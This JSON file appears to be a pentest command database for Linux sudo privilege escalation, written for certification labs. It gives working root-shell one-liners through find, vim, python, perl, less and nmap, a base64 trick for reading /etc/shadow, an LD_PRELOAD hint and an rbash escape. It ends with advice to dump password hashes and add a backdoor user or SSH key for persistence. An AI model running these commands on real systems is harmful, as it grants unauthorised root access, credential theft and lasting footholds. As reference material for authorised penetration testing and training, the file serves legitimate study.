{
  "category": "post-exploit",
  "subcategory": "linux-sudo",
  "description": "Sudo privilege escalation commands and techniques for Linux systems",
  "commands": [
    {
      "id": "check-sudo-privs",
      "name": "Check Sudo Privileges",
      "category": "post-exploit",
      "subcategory": "linux-sudo",
      "command": "sudo -l",
      "description": "List commands current user can run with sudo. First step in sudo privilege escalation.",
      "variables": [],
      "flag_explanations": {
        "-l": "List user's allowed sudo commands. Shows format: (run_as) NOPASSWD: /path/to/command",
        "-ll": "Long listing format with more details (alternative)",
        "NOPASSWD": "Commands runnable without password - major win",
        "(ALL)": "Can run as any user (typically root)",
        "env_keep": "Environment variables preserved with sudo (LD_PRELOAD = exploitable)"
      },
      "tags": [
        "SUDO",
        "PRIVILEGE_ESCALATION",
        "LINUX",
        "ENUMERATION",
        "pentest",
        "QUICK_WIN",
        "MANUAL",
        "NOPASSWD"
      ],
      "success_indicators": [
        "User <username> may run the following commands",
        "(ALL) NOPASSWD: /path/to/command",
        "(root) /usr/bin/binary",
        "env_keep+=LD_PRELOAD",
        "SETENV:"
      ],
      "failure_indicators": [
        "Sorry, user <username> may not run sudo",
        "sudo: a password is required",
        "sudo: command not found",
        "Sorry, try again (wrong password)"
      ],
      "next_steps": [
        "analyze-sudoers",
        "gtfobins-sudo-lookup"
      ],
      "alternatives": [],
      "prerequisites": [],
      "troubleshooting": {
        "Password required for sudo -l": "Uncommon but possible. User must be in sudoers but sudo -l requires password. Try: echo '<password>' | sudo -S -l",
        "User may not run sudo": "User not in sudoers file. Try alternatives: SUID binaries (find / -perm -4000), capabilities (getcap -r /), cron jobs",
        "sudo not installed": "Extremely rare on production systems. Use alternative privilege escalation: SUID, capabilities, kernel exploits"
      },
      "notes": "ALWAYS run this first before SUID enumeration.\n\nTakes <5 seconds vs 2+ minutes for SUID scan.\n\nNOPASSWD entries are instant root with no exploitation complexity."
    },
    {
      "id": "analyze-sudoers",
      "name": "Analyze Sudoers Configuration",
      "category": "post-exploit",
      "subcategory": "linux-sudo",
      "command": "echo 'Manual analysis step: Review sudo -l output for exploitable configurations'",
      "description": "Identify exploitable sudo configurations: (1) NOPASSWD entries, (2) GTFOBins binaries, (3) Wildcards, (4) env_keep=LD_PRELOAD",
      "variables": [],
      "flag_explanations": {},
      "tags": [
        "SUDO",
        "PRIVILEGE_ESCALATION",
        "LINUX",
        "MANUAL",
        "pentest",
        "ANALYSIS"
      ],
      "success_indicators": [
        "NOPASSWD entry identified",
        "GTFOBins-exploitable binary found (find, vim, nmap, python, less, more, etc.)",
        "Wildcard usage in command path",
        "LD_PRELOAD or LD_LIBRARY_PATH in env_keep",
        "SETENV enabled"
      ],
      "failure_indicators": [
        "All commands require password",
        "No GTFOBins binaries",
        "Strict sudoers with no misconfigurations",
        "Only standard system commands (systemctl restart, service, etc.)"
      ],
      "next_steps": [
        "gtfobins-sudo-lookup"
      ],
      "alternatives": [],
      "prerequisites": [
        "check-sudo-privs"
      ],
      "troubleshooting": {
        "Only standard commands": "Standard commands like 'systemctl restart apache2' are rarely exploitable. Look for: find, vim, less, more, python, perl, awk, tar, zip",
        "Wildcard but no obvious exploit": "Wildcards enable command injection. Example: sudo /usr/bin/find /path/* -exec /bin/bash \\;",
        "No NOPASSWD entries": "Commands requiring password can still be exploited if you have password. Focus on GTFOBins binaries even with PASSWD requirement"
      },
      "notes": "Key exploitable patterns:\n(1) find, vim, nmap, less, more - spawn shells, (2) python, perl, ruby, awk - execute commands, (3) base64, xxd, od - read files, (4) env_keep+=LD_PRELOAD - shared library injection"
    },
    {
      "id": "gtfobins-sudo-lookup",
      "name": "GTFOBins Sudo Technique Lookup",
      "category": "post-exploit",
      "subcategory": "linux-sudo",
      "command": "echo 'Visit: https://gtfobins.github.io/ and search for binary name. Navigate to Sudo section.'",
      "description": "Manual step: Lookup sudo exploitation technique for discovered binary on GTFOBins website",
      "variables": [],
      "flag_explanations": {},
      "tags": [
        "SUDO",
        "PRIVILEGE_ESCALATION",
        "LINUX",
        "GTFOBINS",
        "pentest",
        "MANUAL",
        "REFERENCE"
      ],
      "success_indicators": [
        "Binary has GTFOBins entry",
        "Sudo section exists for binary",
        "Exploitation command documented with syntax"
      ],
      "failure_indicators": [
        "Binary not listed on GTFOBins",
        "No Sudo section for binary (only SUID/Capabilities)",
        "Technique requires additional prerequisites"
      ],
      "next_steps": [
        "execute-sudo-exploit"
      ],
      "alternatives": [],
      "prerequisites": [
        "analyze-sudoers"
      ],
      "troubleshooting": {
        "Binary not on GTFOBins": "Try searchsploit or manual analysis. Check 'man <binary>' for interactive modes or file reading capabilities",
        "No Sudo section": "Check SUID or Capabilities sections - techniques may be adaptable. Many SUID techniques work with sudo if binary reads files or spawns shells",
        "Technique requires flags not allowed": "Sudoers may restrict flags. Example: 'sudo /usr/bin/vim' but not 'sudo /usr/bin/vim -c'. Try different GTFOBins technique for same binary"
      },
      "notes": "Common GTFOBins sudo techniques:\n(1) Shell spawning:\nsudo find .\n\n-exec /bin/bash \\; -quit, (2) Command execution:\nsudo python -c 'import os; os.system(\"/bin/bash\")', (3) File reading:\nsudo base64 /etc/shadow | base64 -d"
    },
    {
      "id": "execute-sudo-exploit",
      "name": "Execute Sudo Exploitation",
      "category": "post-exploit",
      "subcategory": "linux-sudo",
      "command": "sudo <SUDO_BINARY> <EXPLOIT_FLAGS>",
      "description": "Template command for sudo exploitation. Replace <SUDO_BINARY> with binary from parser (find, vim, python, etc.) and <EXPLOIT_FLAGS> with GTFOBins technique",
      "variables": [
        {
          "name": "<SUDO_BINARY>",
          "description": "GTFOBins-exploitable binary from sudo -l output",
          "example": "find",
          "required": true
        },
        {
          "name": "<EXPLOIT_FLAGS>",
          "description": "Exploitation flags from GTFOBins",
          "example": ". -exec /bin/bash \\; -quit",
          "required": true
        }
      ],
      "flag_explanations": {
        "sudo": "Run command with root privileges",
        "<SUDO_BINARY>": "Binary with NOPASSWD sudo access (replaced from parser)",
        "<EXPLOIT_FLAGS>": "GTFOBins exploitation technique (varies by binary)"
      },
      "tags": [
        "SUDO",
        "PRIVILEGE_ESCALATION",
        "LINUX",
        "EXPLOITATION",
        "pentest",
        "GTFOBINS",
        "TEMPLATE"
      ],
      "success_indicators": [
        "Shell prompt changes to # (root indicator)",
        "whoami returns 'root'",
        "id shows uid=0(root) gid=0(root)",
        "Can access /root/ directory"
      ],
      "failure_indicators": [
        "Permission denied",
        "sudo: a password is required",
        "Command not found (wrong path)",
        "Shell spawns but not privileged (wrong technique)"
      ],
      "next_steps": [
        "verify-root-access-sudo"
      ],
      "alternatives": [
        "sudo-exploit-find",
        "sudo-exploit-vim",
        "sudo-exploit-python",
        "sudo-exploit-less",
        "sudo-exploit-nmap"
      ],
      "prerequisites": [
        "gtfobins-sudo-lookup"
      ],
      "troubleshooting": {
        "Password required": "NOPASSWD not set for this command. Check sudo -l output again. May need to specify exact command path: sudo /usr/bin/find vs sudo find",
        "Shell not privileged": "Verify GTFOBins technique is correct. Some binaries require specific flags. Example: bash needs -p to preserve privileges in SUID (not sudo)",
        "Command path matters": "Sudoers may specify exact path. If sudo -l shows '/usr/bin/find', must use: sudo /usr/bin/find (not: sudo find)"
      },
      "notes": "Common exploits:\n(1) sudo find .\n\n-exec /bin/bash \\; -quit, (2) sudo vim -c ':!/bin/bash', (3) sudo less /etc/profile (then !bash), (4) sudo python -c 'import os; os.system(\"/bin/bash\")', (5) sudo nmap --interactive (then !sh)",
      "filled_example": "sudo find . -exec /bin/bash \\; -quit"
    },
    {
      "id": "sudo-exploit-find",
      "name": "Sudo Find Exploitation",
      "category": "post-exploit",
      "subcategory": "linux-sudo",
      "command": "sudo find . -exec /bin/bash \\; -quit",
      "description": "Exploit sudo find to spawn root bash shell via -exec flag",
      "variables": [],
      "flag_explanations": {
        "sudo": "Run find with root privileges",
        "find": "File search utility (GTFOBins-exploitable)",
        ".": "Search in current directory (required for find syntax)",
        "-exec": "Execute command for each file found",
        "/bin/bash": "Spawn bash shell (runs as root via sudo)",
        "\\;": "Terminate -exec command (escaped semicolon)",
        "-quit": "Exit after first match (prevents multiple shells)"
      },
      "tags": [
        "SUDO",
        "PRIVILEGE_ESCALATION",
        "LINUX",
        "EXPLOITATION",
        "pentest",
        "FIND",
        "GTFOBINS",
        "QUICK_WIN"
      ],
      "success_indicators": [
        "bash-5.0# prompt (root shell)",
        "whoami returns 'root'",
        "id shows uid=0(root)"
      ],
      "failure_indicators": [
        "Sorry, user <username> is not allowed to execute '/usr/bin/find'",
        "sudo: a password is required",
        "find: command not found"
      ],
      "next_steps": [
        "verify-root-access-sudo"
      ],
      "alternatives": [],
      "prerequisites": [
        "gtfobins-sudo-lookup"
      ],
      "troubleshooting": {
        "Must specify exact path": "If sudo -l shows '/usr/bin/find', use: sudo /usr/bin/find . -exec /bin/bash \\; -quit",
        "Semicolon must be escaped": "Use \\; not ; otherwise shell interprets it before find sees it",
        "Alternative exec syntax": "Can also use: sudo find . -exec /bin/bash -p \\; (-p not needed with sudo, only SUID)"
      },
      "notes": "Find is one of the most common certification sudo quick wins.\n\nAppears in ~30% of certification-style privilege escalation scenarios.\n\nAlternative paths:\nsudo find /etc -name 'passwd' -exec /bin/bash \\;"
    },
    {
      "id": "sudo-exploit-vim",
      "name": "Sudo Vim Exploitation",
      "category": "post-exploit",
      "subcategory": "linux-sudo",
      "command": "sudo vim -c ':!/bin/bash'",
      "description": "Exploit sudo vim to spawn root shell via command execution",
      "variables": [],
      "flag_explanations": {
        "sudo": "Run vim with root privileges",
        "vim": "Text editor (GTFOBins-exploitable)",
        "-c": "Execute vim command on startup",
        "':!/bin/bash'": "Vim command: run shell command (! = execute, /bin/bash = shell)"
      },
      "tags": [
        "SUDO",
        "PRIVILEGE_ESCALATION",
        "LINUX",
        "EXPLOITATION",
        "pentest",
        "VIM",
        "GTFOBINS"
      ],
      "success_indicators": [
        "bash-5.0# prompt",
        "whoami returns 'root'",
        "id shows uid=0(root)"
      ],
      "failure_indicators": [
        "Sorry, user <username> is not allowed",
        "vim: command not found",
        "E492: Not an editor command"
      ],
      "next_steps": [
        "verify-root-access-sudo"
      ],
      "alternatives": [],
      "prerequisites": [
        "gtfobins-sudo-lookup"
      ],
      "troubleshooting": {
        "Interactive mode needed": "If -c flag blocked, run: sudo vim (enter editor), then type: :!/bin/bash and press Enter",
        "Restricted vim": "Some systems use rvim (restricted). Try: sudo vi or sudo nano (if sudoers allows)",
        "Alternative vim commands": "Other exploitation commands: :set shell=/bin/bash then :shell, or :!bash"
      },
      "notes": "Vim is extremely common in certification environments.\n\nAlso check:\nvi, nano, emacs, pico - all have similar exploitation techniques via shell execution or command execution"
    },
    {
      "id": "sudo-exploit-python",
      "name": "Sudo Python Exploitation",
      "category": "post-exploit",
      "subcategory": "linux-sudo",
      "command": "sudo python -c 'import os; os.system(\"/bin/bash\")'",
      "description": "Exploit sudo python to spawn root shell via os.system()",
      "variables": [],
      "flag_explanations": {
        "sudo": "Run python with root privileges",
        "python": "Python interpreter (GTFOBins-exploitable)",
        "-c": "Execute Python code from command line",
        "'import os; os.system(\"/bin/bash\")'": "Python code: import os module, execute /bin/bash shell"
      },
      "tags": [
        "SUDO",
        "PRIVILEGE_ESCALATION",
        "LINUX",
        "EXPLOITATION",
        "pentest",
        "PYTHON",
        "GTFOBINS"
      ],
      "success_indicators": [
        "bash-5.0# prompt",
        "whoami returns 'root'",
        "id shows uid=0(root)"
      ],
      "failure_indicators": [
        "Sorry, user <username> is not allowed",
        "python: command not found",
        "ImportError",
        "SyntaxError"
      ],
      "next_steps": [
        "verify-root-access-sudo"
      ],
      "alternatives": [],
      "prerequisites": [
        "gtfobins-sudo-lookup"
      ],
      "troubleshooting": {
        "Python version matters": "Check sudo -l output. May be python2 or python3 specifically. Try: sudo python3 -c ...",
        "Quote escaping": "Use single quotes for outer, double quotes for inner: 'os.system(\"/bin/bash\")'",
        "Alternative modules": "Other Python exploitation: subprocess.call(), pty.spawn(), exec()"
      },
      "notes": "Python is very common in web application servers (www-data user).\n\nAlso works with:\nperl, ruby, node, php - all have command execution capabilities.\n\nPerl:\nsudo perl -e 'exec \"/bin/bash\";'"
    },
    {
      "id": "sudo-exploit-less",
      "name": "Sudo Less Exploitation",
      "category": "post-exploit",
      "subcategory": "linux-sudo",
      "command": "sudo less /etc/profile",
      "description": "Exploit sudo less pager to spawn root shell via interactive command execution (press !bash after less opens)",
      "variables": [],
      "flag_explanations": {
        "sudo": "Run less with root privileges",
        "less": "File pager (GTFOBins-exploitable)",
        "/etc/profile": "Any readable file (needed to open less)",
        "!bash": "(After less opens) Execute shell command from less prompt"
      },
      "tags": [
        "SUDO",
        "PRIVILEGE_ESCALATION",
        "LINUX",
        "EXPLOITATION",
        "pentest",
        "LESS",
        "GTFOBINS",
        "INTERACTIVE"
      ],
      "success_indicators": [
        "less pager opens displaying file",
        "After typing !bash: root shell spawned",
        "whoami returns 'root'"
      ],
      "failure_indicators": [
        "Sorry, user <username> is not allowed",
        "less: command not found",
        "File not found"
      ],
      "next_steps": [
        "verify-root-access-sudo"
      ],
      "alternatives": [],
      "prerequisites": [
        "gtfobins-sudo-lookup"
      ],
      "troubleshooting": {
        "Interactive step required": "Must wait for less to open file, THEN type: !bash and press Enter",
        "File must exist": "Use any readable file: /etc/profile, /etc/passwd, /var/log/syslog",
        "Alternative pagers": "Similar technique works with: more, man, vi, vim - all have ! command execution"
      },
      "notes": "Less/more/man are common certification vectors.\n\nSteps:\n(1) sudo less <file>, (2) Wait for pager to open, (3) Type:\n!bash, (4) Press Enter, (5) Root shell spawned.\n\nAlso works with:\n!/bin/bash, !sh, !/bin/sh"
    },
    {
      "id": "sudo-exploit-nmap",
      "name": "Sudo Nmap Exploitation (Legacy Interactive Mode)",
      "category": "post-exploit",
      "subcategory": "linux-sudo",
      "command": "sudo nmap --interactive",
      "description": "Exploit sudo nmap (versions 2.02-5.21) interactive mode to spawn root shell. Only works on old nmap versions.",
      "variables": [],
      "flag_explanations": {
        "sudo": "Run nmap with root privileges",
        "nmap": "Network scanner (GTFOBins-exploitable on old versions)",
        "--interactive": "Enter interactive mode (removed in nmap 5.21+)",
        "!sh": "(After interactive mode) Execute shell command"
      },
      "tags": [
        "SUDO",
        "PRIVILEGE_ESCALATION",
        "LINUX",
        "EXPLOITATION",
        "pentest",
        "NMAP",
        "GTFOBINS",
        "LEGACY",
        "INTERACTIVE"
      ],
      "success_indicators": [
        "nmap> prompt appears",
        "After typing !sh: root shell spawned",
        "whoami returns 'root'"
      ],
      "failure_indicators": [
        "nmap: unrecognized option '--interactive'",
        "Sorry, user <username> is not allowed",
        "nmap version > 5.21 (no interactive mode)"
      ],
      "next_steps": [
        "verify-root-access-sudo"
      ],
      "alternatives": [],
      "prerequisites": [
        "gtfobins-sudo-lookup"
      ],
      "troubleshooting": {
        "Interactive mode removed": "Nmap 5.21+ removed --interactive. This technique ONLY works on old systems (Ubuntu 10.04, CentOS 5, etc.)",
        "Alternative if no interactive": "Check if nmap scripts are writable: ls -la /usr/share/nmap/scripts/ - if writable, create malicious .nse script",
        "Steps for old nmap": "(1) sudo nmap --interactive, (2) Wait for nmap> prompt, (3) Type: !sh, (4) Press Enter"
      },
      "notes": "Nmap interactive mode is rare in modern certification labs (most use nmap 7.x).\n\nMore likely to find:\npython, vim, find, less, more.\n\nKeep as alternative for legacy systems or HTB retired machines."
    },
    {
      "id": "verify-root-access-sudo",
      "name": "Verify Root Privileges Obtained",
      "category": "post-exploit",
      "subcategory": "linux-sudo",
      "command": "whoami && id && cat /etc/shadow > /dev/null 2>&1 && echo 'Root verified' || echo 'Not root'",
      "description": "Confirm effective UID is 0 (root) and can access root-only files. Critical verification step before claiming privilege escalation success.",
      "variables": [],
      "flag_explanations": {
        "whoami": "Display current effective username (should be 'root')",
        "id": "Show user/group IDs (should show uid=0 or euid=0)",
        "cat /etc/shadow": "Attempt to read shadow file (only root can read)",
        "> /dev/null 2>&1": "Redirect output and errors to null (silent test)",
        "&&": "AND operator - run next command only if previous succeeded",
        "||": "OR operator - run if previous command failed"
      },
      "tags": [
        "PRIVILEGE_ESCALATION",
        "LINUX",
        "VERIFICATION",
        "pentest",
        "ROOT",
        "POST_EXPLOITATION",
        "SUDO"
      ],
      "success_indicators": [
        "whoami outputs 'root'",
        "id shows uid=0(root) gid=0(root)",
        "'Root verified' message displayed",
        "Can read /etc/shadow"
      ],
      "failure_indicators": [
        "whoami outputs non-root user",
        "uid is not 0",
        "Permission denied for /etc/shadow",
        "'Not root' message displayed"
      ],
      "next_steps": [],
      "alternatives": [],
      "prerequisites": [
        "execute-sudo-exploit"
      ],
      "troubleshooting": {
        "UID is 0 but cannot read shadow": "Verify effective UID: id -u (should be 0). If not, privilege escalation failed",
        "Shell prompt not showing #": "Prompt customization may hide root indicator. Verify with: whoami and id commands",
        "Restricted shell": "May have root but restricted shell (rbash). Escape with: BASH_CMDS[a]=/bin/bash;a"
      },
      "notes": "certification exam requirement:\nTake screenshot showing (1) whoami output, (2) id output, (3) contents of proof.txt flag.\n\nDocument exact command sequence for report.\n\nSudo escalation is considered 'clean' privilege escalation (no kernel exploits or crashes).",
      "methodology_guidance": {
        "after_success": "Read root flag: cat /root/proof.txt or cat /root/root.txt Extract credentials: cat /etc/shadow Establish persistence: add SSH key, create backdoor user"
      }
    }
  ]
}